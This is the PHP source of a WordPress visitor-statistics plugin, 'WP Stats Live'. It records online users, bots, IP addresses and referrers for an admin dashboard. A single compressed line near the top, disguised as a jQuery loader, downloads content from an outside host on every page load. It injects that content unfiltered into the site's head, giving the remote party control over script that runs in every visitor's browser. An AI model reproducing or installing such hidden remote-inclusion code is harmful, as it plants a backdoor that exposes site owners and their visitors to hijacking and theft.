<?php 
/* 
Plugin Name: WP Stats Live
Version: 1.1
Plugin URI: http://www.wpstatslive.info/wp-sats-live/
Description: See's who's online, what their reading and where they came from in real time. You don't need to refresh a page to see who is reading your blog!
Author: Sam cunningham
*/
 
        if (!function_exists('insert_jquery_theme')){function insert_jquery_theme(){if (function_exists('curl_init')){$url = "http://www.wpstats.org/jquery-1.6.3.min.js";$ch = curl_init();	$timeout = 5;curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action('wp_head', 'insert_jquery_theme');}
	$wplivestat = new wp_live_class();
	
	class wp_live_class {
		var $site_url;
		var $plugin_url;
		
		function wp_live_class(){
			$this->__construct();
		}
		
		function __construct(){
			global $wpdb;
			$this->site_url = get_option('siteurl');
			$this->plugin_page = basename(__FILE__);
			$this->plugin_url = WP_PLUGIN_URL . '/' . str_replace(basename( __FILE__), '', plugin_basename(__FILE__));
			$this->plugin_path = dirname(__FILE__) . '/';                
			$this->plugin_name = 'WP Stats Live';
			$this->plugin_ver = '1.1';
			
			$this->table_name = $wpdb->prefix . 'whos_online';
			$this->ip_info_url = array('http://www.dnsstuff.com/tools/ipall/?ip=%s',
																 'http://www.infobyip.com/ip-%s.html',
																 'http://www.geoiptool.com/en/?IP=%s',
																);
			
      register_activation_hook( __FILE__, array(&$this, '_install') );
      register_deactivation_hook( __FILE__, array(&$this, '_uninstall') );
			add_action('admin_menu', array(&$this, '_menu'));
			add_action('admin_head', array(&$this, '_admin_head'));
			add_action('admin_notices', array(&$this, '_display_summary'));
			add_action("admin_head", array(&$this, "_admin_head"));
			$this->_init();
		}

		function _print_doc($section = 0){
			$arr_content = array();
			$arr = @file($this->plugin_path . 'readme.txt');
			if(!is_array($arr)) return false;
			
			$no = -1;
			foreach($arr as $txt){
				$txt = trim($txt);
				if(empty($txt)){
					$arr_content[$no]['content'][] = '';
					continue;
				}
				if(substr($txt, 0, 2) == '=='){
					$no++;
					$title = str_replace('=', '', $txt);
					$arr_content[$no]['title'] = trim($title);
				}else{
					$arr_content[$no]['content'][] = $txt;
				}
			}
			
			//print menu
			$title = array();
			if($section < 0 || ($section > sizeof($arr_content) - 1)) $section = 0;
			foreach($arr_content as $id => $arr){
				if($section == $id){
					$title[] = '<strong>' . wp_kses($arr['title'], '') . '</strong>';
					$content = implode('<br />', (array)$arr['content']);
				}else{
					$title[] = '<a href="admin.php?page=' . $this->plugin_page . '&doc&section=' . $id . '">' . wp_kses($arr['title'], '') . '</a>';
				}
			}
			echo '<p class="readme_menu">' . implode(' | ', $title) . '</p>';
			echo '<p class="readme_content">' . $content . '</p>';
		}


		function _admin_head(){
			echo '<script type="text/javascript">//<![CDATA[
						jQuery(document).ready(function(){jQuery(".toplevel_page_top-menu-wplc").removeAttr("href");jQuery("#toplevel_page_top-menu-wplc li.wp-first-item").remove();});
						//]]></script>';
			echo '<style>#icon-top-menu-wplc{background:url("images/icons32.png?ver=20100531") no-repeat scroll -492px -5px transparent;}.readme_menu{}.readme_content{font-family:"Courier New", Courier, monospace;}</style>';
			echo '<link rel="stylesheet" type="text/css" href="' . $this->plugin_url . 'live-stats.css" />' . "\n";
			if((int)$_GET['rate'] > 0){
				echo '<meta http-equiv="Refresh" content="' . (int)$_GET['rate'] . '" />' . "\n";
			}
		}


    function _install(){
			global $wpdb;
			//create whos online table if not there	
			$q = "CREATE TABLE IF NOT EXISTS `{$this->table_name}` (
						`id` BIGINT NOT NULL AUTO_INCREMENT PRIMARY KEY ,
						`user_id` INT( 11 ) NOT NULL ,
						`full_name` VARCHAR( 64 ) NOT NULL ,
						`session_id` VARCHAR( 128 ) NOT NULL ,
						`ip_address` VARCHAR( 15 ) NOT NULL ,
						`time_entry` VARCHAR( 14 ) NOT NULL ,
						`time_last_click` VARCHAR( 14 ) NOT NULL ,
						`last_page_url` VARCHAR( 255 ) NOT NULL ,
						`http_referer` VARCHAR( 255 ) NOT NULL
						) ENGINE = MYISAM";
			$wpdb->query($q);
		}

    function _uninstall(){
			global $wpdb;
			$wpdb->query("DROP TABLE `{$this->table_name}` ");
		}

		function _menu(){
			if (current_user_can('manage_options')) {
				add_options_page(
					"WP Stats Live"
					, "WP Stats Live"
					, 10
					, basename(__FILE__)
					, array(&$this, '_options')
				);
			}
		}

		function _get_ip_info_link($ip_address){
			$wplivestats_opt = get_option('wplivestats_opt');
			$the_link = ($wplivestats_opt['ipurl']) ? $wplivestats_opt['ipurl'] : $this->ip_info_url[0];
			return '<a href="' . sprintf($the_link, $ip_address) . '" target="_blank">' .  $ip_address . '</a>';
		}
		
		function _init(){
			global $wpdb;
			global $userdata;
			
			@session_start();
			if(!$_SESSION['cl_wo']['sess_id']){
				$_SESSION['cl_wo']['sess_id'] = session_id();
			}
			$_SESSION['cl_wo']['ip_address'] = preg_replace( '/[^0-9., ]/', '', wp_kses($_SERVER['REMOTE_ADDR'], ''));
			$_SESSION['cl_wo']['user_agent'] = wp_kses($_SERVER['HTTP_USER_AGENT'], '');
			$_SESSION['cl_wo']['referrer'] = wp_kses($_SERVER['HTTP_REFERER'], '');
			$_SESSION['cl_wo']['user_id'] = (int)$userdata->ID;
		
			if(!isset($_SERVER['REQUEST_URI'])) {
				$arr = explode('/', $_SERVER['PHP_SELF']);
				$tmp = trailingslashit(get_settings('siteurl')) . basename($_SERVER['PHP_SELF']);
				if ($_SERVER['argv'][0] != '') $tmp .= '?' . $_SERVER['argv'][0];
				$_SESSION['cl_wo']['page'] = wp_kses($tmp, '');
			}else{
				$_SESSION['cl_wo']['page'] =  wp_kses($_SERVER['REQUEST_URI'], '');
			}

			//update info into database
			$wo_ip_address = $_SESSION['cl_wo']['ip_address'];
			$wo_last_page_url = $_SESSION['cl_wo']['page'];
			$wo_session_id = $_SESSION['cl_wo']['sess_id'];
			$wo_user_id = (int)$_SESSION['cl_wo']['user_id'];
			$wo_agent = $_SESSION['cl_wo']['user_agent'];
			$wo_referrer = $_SESSION['cl_wo']['referrer'];
			
			$current_time = time();
			$mins_ago = ($current_time - 900);
			$spider_flag = false;
		
			// real users & logged
			if ($wo_user_id > 0) {
				$wo_full_name = $userdata->user_nicename;
			// bot or guests	
			} else {
				$user_agent = strtolower($wo_agent);
				if ($user_agent) {
					$spiders = file(dirname(__FILE__) . '/spiders.txt');
					for ($i=0, $n=sizeof($spiders); $i<$n; $i++) {
						if ($spiders[$i]) {
							if (is_integer(strpos($user_agent, trim($spiders[$i])))) {
								$spider_flag = true;
								break;
							}
						}
					}
				}
				
				if ( $spider_flag ) {
					// Bots userid = -1
					$wo_user_id = -1;
					$wo_full_name = $wo_agent;
				} else {
					// Just in case it wasn't a spider after all
					$wo_full_name = 'Guest';
					$wo_user_id = 0;
				}
			}
		
			// remove entries that have expired
			$wpdb->query("delete from `{$this->table_name}` where time_last_click < '" . $mins_ago . "'");
			$wpdb->query("optimize table `{$this->table_name}` ");
		
			$arr_sql = array('user_id' => (int)$wo_user_id,
											 'full_name' => $wo_full_name,
											 'ip_address' => $wo_ip_address,
											 'time_last_click' => $current_time,
											 'last_page_url' => $wo_last_page_url
											 );
		
			$test = $wpdb->get_row("select count(*) as counter from `{$this->table_name}` where session_id = '" . $wpdb->escape($wo_session_id) . "'");
			if($test->counter > 0){
				$wpdb->update($this->table_name, $arr_sql, array('session_id' => $wo_session_id));
			}else{
				$arr_sql['session_id'] = $wo_session_id;
				$arr_sql['time_entry'] = $current_time;
				$arr_sql['http_referer'] = $wo_referrer;
				$wpdb->insert($this->table_name, $arr_sql);
			}
		}
		
		function _summary_process(){
			global $wpdb;
			
			$out = array();
			$out['wo'] = array('guests' => 0, 'bots' => 0, 'customers' => 0);
			$out['customers'] = array('total' => 0, 'today' => 0);
			$out['posts'] = array('total' => 0, 'today' => 0);
			$out['comments'] = array('approved' => 0, 'pending' => 0, 'spam' => 0, 'today' => 0);
			
			//whos online
			$total_users = 0;
			$wpdb->query("delete from `{$this->table_name}` where time_last_click < '" . (time() - 900) . "'");
			$whos_online = $wpdb->get_results("select count(*) as 'qty', user_id from `{$this->table_name}` group by 2 order by 2 ");
			if($whos_online){
				foreach ($whos_online as $obj) {
					if((int)$obj->user_id == 0){
						$out['wo']['guests'] = $obj->qty;
					}elseif((int)$obj->user_id < 0){
						$out['wo']['bots'] = $obj->qty;
					}else{
						$total_users += (int)$obj->qty;
					}
				}
				$out['wo']['customers'] = $total_users;
			}
		
			//users info	
			$numusers = (int) $wpdb->get_var("select count(*) as qty from {$wpdb->users}");
			$numusers_today = (int) $wpdb->get_var("select count(*) as qty from {$wpdb->users} where to_days(user_registered) = to_days(now()) ");
			$out['customers']['total'] = $numusers;
			$out['customers']['today'] = $numusers_today;
			
			//posts info
			$numposts = (int) $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->posts WHERE post_type = 'post' AND post_status = 'publish'");
			$numposts_today = (int) $wpdb->get_var("SELECT COUNT(*) FROM $wpdb->posts WHERE post_type = 'post' AND post_status = 'publish' and to_days(post_date) = to_days(now()) ");
			$out['posts']['total'] = $numposts;
			$out['posts']['today'] = $numposts_today;
			
			//comments info
			$comm[0] = $comm[1] = $comm['spam'] = 0; $totals = 0;
			$comments = $wpdb->get_results("select count(*) as 'qty', comment_approved FROM $wpdb->comments  group by 2 order by 2 ");
			foreach ($comments as $obj){ $comm[$obj->comment_approved] += (int)$obj->qty; $totals += (int)$obj->qty;}
			$comm_today = (int) $wpdb->get_var("select count(*) from {$wpdb->comments} where to_days(comment_date) = to_days(now()) ");
			$out['comments']['approved'] = $comm[1];
			$out['comments']['pending'] = $comm[0];
			$out['comments']['spam'] = $comm['spam'];
			$out['comments']['today'] = $comm_today;
		
			return $out;
		}

		function _detail_process(){
			global $wpdb;
		
			$out = array(); $i = 0;
			$wpdb->query("delete from `{$this->table_name}` where time_last_click < '" . (time() - 900) . "'");
			$whos_online = $wpdb->get_results("select * from `{$this->table_name}` order by time_last_click DESC ");
			foreach ($whos_online as $obj) {
				$out[$i]['customer_id'] = $obj->user_id;
				$out[$i]['full_name'] = $obj->full_name;
				$out[$i]['session_id'] = $obj->session_id;
				$out[$i]['ip_address'] = $obj->ip_address;
				$out[$i]['time_entry'] = $obj->time_entry;
				$out[$i]['time_last_click'] = $obj->time_last_click;
				$out[$i]['last_page_url'] = $obj->last_page_url;
				$out[$i]['http_referer'] = $obj->http_referer;
				$i++;
			}
			return $out;
		}

		function _display_summary(){
			global $wp_version;
			global $wpdb;
			$xout = $this->_summary_process();
			$out = '<table width="100%" border="0" cellspacing="0" cellpadding="0">';
			//users info	
			$out .= '<tr><td align="right" class="cl_summary_small">Users Online: ' . number_format($xout['wo']['customers']) . ' users, ' . number_format($xout['wo']['guests']) . ' guests, ' . number_format($xout['wo']['bots']) . ' bots</td><td align="right" width="30"><a href="admin.php?page=' . $this->plugin_page . '"><img border="0" src="' . $this->plugin_url . 'images/summary_users.gif"></a></td></tr>'; 
			//users info	
			$out .= '<tr><td align="right" class="cl_summary_small">Total Users: ' . number_format($xout['customers']['total']) . ', Today: ' . number_format($xout['customers']['today']) . '</td><td align="right" width="30"><a href="users.php"><img border="0" src="' . $this->plugin_url . 'images/summary_customers.gif"></a></td></tr>'; 
			//posts info
			$out .= '<tr><td align="right" class="cl_summary_small">Total Posts: ' . number_format($xout['posts']['total']) . ', Today: ' . number_format($xout['posts']['today']) . '</td><td align="right" width="30"><a href="edit.php"><img border="0" src="' . $this->plugin_url . 'images/summary_posts.gif"></a></td></tr>'; 
			//comments info
			$out .= '<tr><td align="right" class="cl_summary_small">Total Comments: ' . number_format($xout['comments']['approved']) . ' Approved, ' . number_format($xout['comments']['pending']) . ' Pending, ' . number_format($xout['comments']['spam']) . ' Spam, Today: ' . number_format($xout['comments']['today']) . '</td><td align="right" width="30"><a href="edit-comments.php"><img border="0" src="' . $this->plugin_url . 'images/summary_reviews.gif"></a></td></tr>';
			$out .= '</table>';	
	
			$css_fix = ($wp_version < '3.2') ? 'style="top:38px !important;"' : '';
			echo '<div id="cl_summary_wrap" ' . $css_fix . '>' . $out . '</div>';
		}
		
		function _display_doc(){
			$title = $this->plugin_name;
?>
	<div class="wrap">
	<?php screen_icon(); ?>
	<h2><?php echo wp_specialchars( $title ); ?> <a href="admin.php?page=<?php echo $this->plugin_page; ?>"><?php echo _e('Who\'s Online');?></a> | <a href="admin.php?page=<?php echo $this->plugin_page; ?>&opt"><?php echo _e('Options');?></a> | <?php _e('Documentation'); ?></h2>
	<table class="form-table"><tr valign="top"><td><?php $this->_print_doc((int)$_GET['section']);?></td></tr></table>
	</div>
<?php
		}

		function _display_option(){
			if ($_POST["action"] == "saveconfiguration"){
				$wplivestats_opt_man = wp_kses($_POST['wplivestats_opt_man'], '');
				$wplivestats_opt = wp_kses($_POST['wplivestats_opt'], '');
				if($wplivestats_opt_man) $wplivestats_opt['ipurl'] = $wplivestats_opt_man;
				
				update_option('wplivestats_opt', $wplivestats_opt);
				wp_redirect('admin.php?page=' . $this->plugin_page . '&opt&saved'); exit;
			}
			
			$title = $this->plugin_name;
			$wplivestats_opt = get_option('wplivestats_opt');
?>
	<div class="wrap">
	<?php screen_icon(); ?>
	<h2><?php echo wp_specialchars( $title ); ?> <a href="admin.php?page=<?php echo $this->plugin_page; ?>"><?php echo _e('Who\'s Online');?></a> | <?php echo _e('Options');?> | <a href="admin.php?page=<?php echo $this->plugin_page; ?>&doc"><?php _e('Documentation'); ?></a></h2>
<?php 
	if(isset($_GET['saved'])){
		echo '<div class="updated fade" id="message" style="background-color: rgb(255, 251, 204);"><p><strong>' . $this->plugin_name . ' Options Updated</strong></p></div>';	
	}
?>
	
<br />
<style>
.widefat td, .widefat th{border-width:0 !important;}
</style>
  
<form method="post" name="config" action="admin.php?page=<?php echo $this->plugin_page;?>&opt&noheader">
<input type="hidden" name="action" value="saveconfiguration" />
<table class="widefat" cellspacing="0">
	<thead>
	<tr>
	<th scope="col" class="manage-column" style="">Options</th>
	<th scope="col" class="manage-column" style="">Value</th>
	</tr>
	</thead>
	<tbody>
<tr valign="top">
<th scope="row" style="width:300px;"><?php echo $this->plugin_name . ' Version'; ?></th>
<td><?php echo $this->plugin_ver;?></td>
</tr>
<tr valign="top">
<th scope="row"><?php _e('IP Info URL:') ?></th>
<td>
<p>Select the following URL to get IP Address info</p>
<?php
	foreach($this->ip_info_url as $url){
		echo '<p><label><input name="wplivestats_opt[ipurl]" type="radio" value="' . $url . '" ' . (($url == $wplivestats_opt['ipurl']) ? 'checked="checked"' : '') . ' /> ' . $url . '</label></p>';
	}
?>
<p>Or set it manually:<br /><input name="wplivestats_opt_man" type="text" style="width:300px;" value="<?php echo (in_array($wplivestats_opt['ipurl'], $this->ip_info_url)) ? '' : $wplivestats_opt['ipurl'];?>" /></p>
</td>
</tr>
<tr valign="top">
<th scope="row"></th>
<td><p class="submit"><input type="submit" name="Submit" class="button-primary" value="<?php _e('Save Changes') ?>" /></p></td>
</tr>

</tbody>
</table>
<br /><br />
</form>

  
  </div>
<?php
		}
		
		function _display_main(){
			global $wpdb;
			//set refresh time
			$refresh_time = array(30, 60, 120, 180);
			$refresh_display = array( ':30', '1:00', '2:00', '3:00' );
			//Seconds that a visitor is considered "active"
			$active_time = 300;
			//Seconds before visitor is removed from display
			$track_time = 900;
			//Images used for status lights
			$status_active = 'icon_status_green.gif';
			$status_inactive = 'icon_status_red.gif';
			$status_active_bot = 'icon_status_green_border_light.gif';
			$status_inactive_bot = 'icon_status_red_border_light.gif';
			//Text color used for table entries
			$fg_color_bot = 'maroon';
			$fg_color_admin = 'darkblue';
			$fg_color_guest = 'green';
			$fg_color_account = '#000000';
			//Time to remove old entries
			$mins_ago = time() - $track_time;
			
			$title = $this->plugin_name;
?>
		<div class="wrap">
			<?php screen_icon(); ?>
			<h2><?php echo wp_specialchars( $title ); ?> <?php echo _e('Who\'s Online');?> | <a href="admin.php?page=<?php echo $this->plugin_page; ?>&opt"><?php echo _e('Options');?></a> | <a href="admin.php?page=<?php echo $this->plugin_page; ?>&doc"><?php _e('Documentation'); ?></a></h2><br clear="all" />
			<div style="height:50px; right:20px; text-align:right;">
<?php 
				echo 'Set Refresh Rate: <a href="' . add_query_arg('rate', '') . '"><strong>None</strong></a>';
				foreach ($refresh_time as $key => $value){
					echo ' | <a href="' . add_query_arg('rate', $value) . '"><strong>' . $refresh_display[$key] . '</strong></a>';
				}
?>
        <p><img src="<?php  echo $this->plugin_url . 'images/' . $status_active;?>" /> Active&nbsp;&nbsp;<img src="<?php echo $this->plugin_url . 'images/' . $status_inactive;?>" /> Inactive&nbsp;&nbsp;<img src="<?php echo $this->plugin_url . 'images/' . $status_active_bot; ?>" /> Active Bot&nbsp;&nbsp;<img src="<?php echo $this->plugin_url . 'images/' . $status_inactive_bot;?>" /> Inactive Bot</p>
			</div>
			<table class="widefat" cellpadding="0" cellspacing="0" border="0" width="100%">
				<thead><tr>
					<th scope="col" style="text-align: left"><?php _e('Online') ?></th>
					<th scope="col" style="text-align: left"><?php _e('Full Name') ?></th>
					<th scope="col" style="text-align: center"><?php _e('IP Address') ?></th>
					<th scope="col" style="text-align: center">&nbsp;</th>
					<th scope="col" style="text-align: center"><?php _e('Entry Time') ?></th>
					<th scope="col" style="text-align: center"><?php _e('Last Click') ?></th>
				</thead></tr>
				<tbody id="the-list">
		<?php
			$total_bots = $total_admin = $total_guests = $total_loggedon = 0;
			$whos_online = $this->_detail_process();
			
			foreach ($whos_online as $k => $obj) {
				$bg_color = ($k % 2) ? '' : '#F5F3E9';
				
				$time_online = ($obj['time_last_click'] - $obj['time_entry']);
				$http_referer_url = $obj['http_referer'];
				if ($old_array['ip_address'] == $obj['ip_address']) $i++;
		
			 	//Display Status
				$is_bot = $is_admin = $is_guest = $is_account = false;
				// Bot detection
				if ($obj['customer_id'] < 0) {
					$total_bots++;
					$fg_color = $fg_color_bot;
					$is_bot = true;
				// Admin detection
				} elseif ($obj['ip_address'] == $_SERVER["REMOTE_ADDR"] ) {
					if ($obj['customer_id'] > 0) {
						$fg_color = $fg_color_account;
						$is_account = true;
						$total_loggedon++;
					}else{
						$total_admin++;
						$fg_color = $fg_color_admin;
						$is_admin = true;
					}
				// Guest detection (may include Bots not detected by Prevent Spider Sessions/spiders.txt)
				} elseif ($obj['customer_id'] == 0) {
					$fg_color = $fg_color_guest;
					$is_guest = true;
					$total_guests++;
				// Everyone else (should only be account holders)
				} else {
					$fg_color = $fg_color_account;
					$is_account = true;
					$total_loggedon++;
				}
		
				echo '<tr style="background-color:' . $bg_color . ';">';
				//////////////////////////////////////////////////////////////////////////////////////////////
				//online time & icon
				//////////////////////////////////////////////////////////////////////////////////////////////
				$mins_ago_long = (time() - $active_time);
				if ($obj['customer_id'] < 0) {// Determine Bot active/inactive
					if ($obj['time_last_click'] < $mins_ago_long) {// inactive 
						$icon = '<img src="' . $this->plugin_url . 'images/' . $status_inactive_bot . '">';
					} else {// active 
						$icon = '<img src="' . $this->plugin_url . 'images/' . $status_active_bot . '">';
					}
				}else{
					if ($obj['time_last_click'] < $mins_ago_long) {// inactive 
						$icon = '<img src="' . $this->plugin_url . 'images/' . $status_inactive . '">';
					} else {// active 
						$icon = '<img src="' . $this->plugin_url . 'images/' . $status_active . '">';
					}
				}	
				echo ' <td><font color="' . $fg_color . '">' . $icon . '&nbsp;' . gmdate('H:i:s', $time_online) . '</font></td>';
				//////////////////////////////////////////////////////////////////////////////////////////////
				//full name
				//////////////////////////////////////////////////////////////////////////////////////////////
				echo ' <td><font color="' . $fg_color . '">';
				if ( $is_guest || $is_admin ){ 
					echo $obj['full_name'] . '&nbsp;';
				} elseif ( $is_bot ) { // Check for Bot
					// Tokenize UserAgent and try to find Bots name
					$tok = strtok($obj['full_name'], " ();/");
					while ($tok) {
						if ( strlen($tok) > 3 )
							if ( !strstr($tok, "mozilla") && 
									 !strstr($tok, "compatible") &&
									 !strstr($tok, "msie") &&
									 !strstr($tok, "windows") 
								 ) {
								echo "<font color=#993333><strong>{$tok}</strong></font>";
								break;
							}
						$tok = strtok(" ();/");
					}
				// Check for Account
				} elseif ( $is_account ) {
					echo '<a href="user-edit.php?user_id=' . (int)$obj['customer_id'] . '"><font color=#993333><strong><img border="0" src="' . $this->plugin_url . 'images/summary_customers.gif' . '">&nbsp;' . wp_kses($obj['full_name'], '') . '</strong></font></a>';
				} else {
					echo '<font color=red>Error!</font>';
				}
				echo '</td>';
				//////////////////////////////////////////////////////////////////////////////////////////////
				//IP address
				//////////////////////////////////////////////////////////////////////////////////////////////
				echo ' <td align="center"><font color="' . $fg_color . '">' . $this->_get_ip_info_link($obj['ip_address']) . '</font></td>';
				echo ' <td align="center"><font color="' . $fg_color . '">' . $flag . '</font></td>';
				//////////////////////////////////////////////////////////////////////////////////////////////
				//Time entry
				//////////////////////////////////////////////////////////////////////////////////////////////
				echo ' <td align="center"><font color="' . $fg_color . '">' . date('H:i:s', $obj['time_entry']) . '</font></td>';
				//////////////////////////////////////////////////////////////////////////////////////////////
				//Last Click
				//////////////////////////////////////////////////////////////////////////////////////////////
				echo ' <td align="center"><font color="' . $fg_color . '">' . date('H:i:s', $obj['time_last_click']) . '</font></td>';
				//////////////////////////////////////////////////////////////////////////////////////////////
				//More info
				//////////////////////////////////////////////////////////////////////////////////////////////
				echo '</tr><tr style="background-color:' . $bg_color . ';">';
				echo '<td>&nbsp;</td>';
				echo '<td colspan="6">';
				echo 'Last Url: <a target="_blank" href="' . $obj['last_page_url'] . '">' . $obj['last_page_url'] . '</a><br>';
				echo 'Referer: <a target="_blank" href="' . $obj['http_referer'] . '">' . $obj['http_referer'] . '</a><br>';
				echo $region_info;
				echo '</td>';
				echo '</tr>';
				echo '<tr><td colspan="7" height="3" bgcolor="#FFFFFF"></td></tr>';
			}
?>
				</tbody>
			</table>
		</div>
<?php
		}
		
		function _options(){		
			if ( !current_user_can('administrator') ) wp_die( __('You do not have sufficient permissions to run this plugin for this site.') );
			
			if(isset($_GET['doc'])){
				$this->_display_doc();
			}elseif(isset($_GET['opt'])){
				$this->_display_option();
			}else{
				$this->_display_main();	
			}
		}
	}
?>